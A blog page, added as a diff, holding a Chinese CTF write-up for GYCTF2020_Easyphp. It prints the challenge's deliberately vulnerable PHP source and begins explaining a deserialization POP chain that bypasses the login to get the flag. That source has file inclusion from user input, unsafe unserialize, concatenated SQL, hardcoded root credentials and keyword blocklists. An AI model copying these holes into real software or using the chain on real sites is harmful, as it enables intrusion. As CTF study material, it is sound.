@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="196082">
+    
+    <title>
+        
+            GYCTF2020_Easyphp |
+        
+        196082&#39;s blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/ufo.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/css/font-awesome.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"cv196082.gitee.io","root":"/","language":"zh-CN","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/batman.jpeg","favicon":"/images/ufo.ico","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.3"};
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 月前","year":"%s 年前"};
+  </script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                196082&#39;s blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">GYCTF2020_Easyphp</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/batman.jpeg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">196082</span>
+                        
+                            <span class="author-label">CTO</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2021-09-25 00:10:53
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/web-buuctf/">web-buuctf</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/pop%E9%93%BE/">pop链</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h3 id="获取信息"><a href="#获取信息" class="headerlink" title="获取信息"></a>获取信息</h3><h4 id="扫目录"><a href="#扫目录" class="headerlink" title="扫目录"></a>扫目录</h4><p>我的dirsearch不出所料的没扫到<a class="link"   target="_blank" rel="noopener" href="http://www.zip看了wp才知道是有源文件泄漏/" >www.zip看了wp才知道是有源文件泄漏<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;lib.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="keyword">__DIR__</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>].<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]==<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=update&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=login&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>login.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;lib.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt; </span><br><span class="line">&lt;title&gt;login&lt;/title&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">	&lt;form action=<span class="string">&quot;login.php&quot;</span> method=<span class="string">&quot;post&quot;</span> style=<span class="string">&quot;margin-top: 300&quot;</span>&gt;</span><br><span class="line">		&lt;h2&gt;百万前端的用户信息管理系统&lt;/h2&gt;</span><br><span class="line">		&lt;h3&gt;半成品系统 留后门的程序员已经跑路&lt;/h3&gt;</span><br><span class="line">        		&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> placeholder=<span class="string">&quot;UserName&quot;</span> required&gt;</span><br><span class="line">		&lt;br&gt;</span><br><span class="line">		&lt;input type=<span class="string">&quot;password&quot;</span> style=<span class="string">&quot;margin-top: 20&quot;</span> name=<span class="string">&quot;password&quot;</span> placeholder=<span class="string">&quot;password&quot;</span> required&gt;</span><br><span class="line">		&lt;br&gt;</span><br><span class="line">		&lt;button style=<span class="string">&quot;margin-top:20;&quot;</span> type=<span class="string">&quot;submit&quot;</span>&gt;登录&lt;/button&gt;</span><br><span class="line">		&lt;br&gt;</span><br><span class="line">		&lt;img src=<span class="string">&#x27;img/1.jpg&#x27;</span>&gt;大家记得做好防护&lt;/img&gt;</span><br><span class="line">		&lt;br&gt;</span><br><span class="line">		&lt;br&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$user</span>=<span class="keyword">new</span> user();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">&quot;/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;&lt;br&gt;Damn you, hacker!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">&quot;/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;Damn you, hacker!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$user</span>-&gt;login();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">	&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;</span><br></pre></td></tr></table></figure>
+
+<p>lib.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params"><span class="variable">$parm</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$array</span> = <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>, <span class="string">&#x27;regexp&#x27;</span>, <span class="string">&#x27;load&#x27;</span>, <span class="string">&#x27;into&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="variable">$array</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$parm</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$mysqli</span> = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="variable">$mysqli</span>-&gt;login(<span class="string">&#x27;select id,password from user where username=?&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;id) &#123;</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="keyword">$this</span>-&gt;id;</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="number">1</span>;           <span class="comment">// target</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;你的ID是&quot;</span> . <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;你好！&quot;</span> . <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;id;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$Info</span> = unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">        <span class="variable">$age</span> = <span class="variable">$Info</span>-&gt;age;</span><br><span class="line">        <span class="variable">$nickname</span> = <span class="variable">$Info</span>-&gt;nickname;</span><br><span class="line">        <span class="variable">$updateAction</span> = <span class="keyword">new</span> UpdateHelper(<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>], <span class="variable">$Info</span>, <span class="string">&quot;update user SET age=<span class="subst">$age</span>,nickname=<span class="subst">$nickname</span> where id=&quot;</span> . <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">        <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$age</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">        <span class="variable">$nickname</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info(<span class="variable">$age</span>, <span class="variable">$nickname</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;nickname); <span class="comment">//危</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// nickname = new Info();</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;0-0&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$CtrlCase</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$age</span>, <span class="variable">$nickname</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$argument</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// CtrlCase = new dbCtrl();</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login(<span class="variable">$argument</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="comment">// argument[0] = &#x27;select id,md5(1) from user where username=?&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UpdateHelper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$newinfo</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$newInfo</span>, <span class="variable">$sql</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$newInfo</span> = unserialize(<span class="variable">$newInfo</span>);</span><br><span class="line">        <span class="variable">$upDate</span> = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// sql = new User();</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hostname</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$database</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mysqli</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token = <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$sql</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli = <span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;连接失败，错误:&quot;</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;mysqli-&gt;prepare(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$result</span>-&gt;bind_param(<span class="string">&#x27;s&#x27;</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        <span class="variable">$result</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$result</span>-&gt;bind_result(<span class="variable">$idResult</span>, <span class="variable">$passwordResult</span>);</span><br><span class="line">        <span class="variable">$result</span>-&gt;fetch();</span><br><span class="line">        <span class="variable">$result</span>-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token == <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$idResult</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$idResult</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> (<span class="string">&#x27;用户不存在!&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password) !== <span class="variable">$passwordResult</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> (<span class="string">&#x27;密码错误！&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>] = <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$idResult</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"><span class="variable">$sql</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//还没来得及写</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>update.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;lib.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;update&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;你还没有登陆呢！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$users</span>=<span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$users</span>-&gt;update();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]===<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>经过审计可以很轻易的发现漏洞点在update.php</p>
+<p><img src="/images/image-20210925002254738.png" alt="image-20210925002254738"></p>
+<p>即便是上面if语句成立也会执行下面的内容</p>
+<p><img src="/images/image-20210925002329063.png" alt="image-20210925002329063"></p>
+<p>然后存在反序列化漏洞，开始看见下面存在file_get_contents觉得可以直接获取flag但是是我想多了，上面有个safe函数过滤了flag关键字。</p>
+<p><img src="/images/image-20210925002503416.png" alt="image-20210925002503416"></p>
+<p>只要我的session文件login为1就可以拿到flag，再看lib.php那里修改了session</p>
+<p><img src="/images/image-20210925002549245.png" alt="image-20210925002549245"></p>
+<p>User的login函数会修改$_SESSION[‘login’]=1,但是一定要this-&gt;id存在，所以必定要执行这个sql语句</p>
+<p><img src="/images/image-20210925002702884.png" alt="image-20210925002702884"></p>
+<p>里面只需要this-&gt;token为admin就可以返回id所以只需要最下面的$_SESSION[‘token’]=$this-&gt;name执行了，后续直接随便登录就行。</p>
+<h4 id="构造pop链"><a href="#构造pop链" class="headerlink" title="构造pop链"></a>构造pop链</h4><p>由上面可知我们最后需要执行的是dbCtrl-&gt;login()</p>
+<p>往上看有一个很显眼的</p>
+<p><img src="/images/image-20210925003101147.png" alt="image-20210925003101147"></p>
+<p>看得到这里有一个很刺眼的login，所以在倒数第二步应该是他了(这些赋值的注释是我在做题过程中自己写的一些笔记)</p>
+<p>然后就是找到调用__call的地方</p>
+<p>在User类里面的__toString函数里面存在可以达到目的的调用方式</p>
+<p><img src="/images/image-20210925003323548.png" alt="image-20210925003323548"></p>
+<p>最后在哪调用__toString也很简单了</p>
